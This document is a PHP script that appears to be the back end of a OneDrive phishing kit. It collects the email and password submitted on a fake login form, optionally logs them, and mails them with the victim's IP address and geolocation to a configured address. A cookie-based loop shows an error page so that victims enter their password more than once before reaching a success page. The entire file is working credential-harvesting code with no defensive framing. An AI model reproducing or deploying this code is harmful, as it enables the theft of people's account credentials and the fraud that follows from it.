<?php
class Send {

    static public $count = 1;

    static public function Mail($email, $password) {

        $ip = ipModel::get();
        $remoteIP = Client::IP();
        $browser = Client::Browser();
        $toEmail = Config::Get('email');
        $date = date("D M d, Y g:i a");
        
        $subject = Config::Get('subject') . ' : ' . $email;

        $message = "----------------OneDrive--------------------\n";
        $message .= "Email Address  : ".$email."\n";
        $message .= "Password   : ".$password."\n";
        $message .= "==================================================\n";
        $message .= "Country : ".$ip['country']." | State : ".$ip['region']." | City : ".$ip['city']."\n";
        $message .= "IP : ".$remoteIP." | Date : ".date("g:i:s:a || D-d-M-Y")."\n";
        $message .= "==================================================\n";

        @mail($toEmail, $subject, $message);
    }

    static public function Fetch($inputs)
    {
        if(Utility::isValid($inputs['xdataE']) && Utility::isValid($inputs['xdataP']))
        {

            $email = $inputs['xdataE'];
            $password = $inputs['xdataP'];
            $string = str_replace('"','',Utility::UniqueId());
            if(Config::Get('saveLogs'))
            {
                Logger::Log($email, $password);
            }

            if(isset($_COOKIE['loop']))
            {
                if($_COOKIE['loop'] != Config::Get('loop'))
                {
                    self::Mail($email, $password);
                    setcookie('loop', $_COOKIE['loop'] + 1, time() + (86400 * 30), "/");
                    header("Location: confirm.php?$string&share=". base64_encode($email) ."&error=true");
                    exit();
                }

                if($_COOKIE['loop'] == Config::Get('loop'))
                {
                    self::Mail($email, $password);
                    setcookie('loop', $_COOKIE['loop'] + 1, time() + (86400 * 30), "/");
                    header("Location: success.php?$string&share=". base64_encode($email) ."&error=false");
                    exit();
                }
            }
        }
    }
}

Send::Fetch($_POST);
?>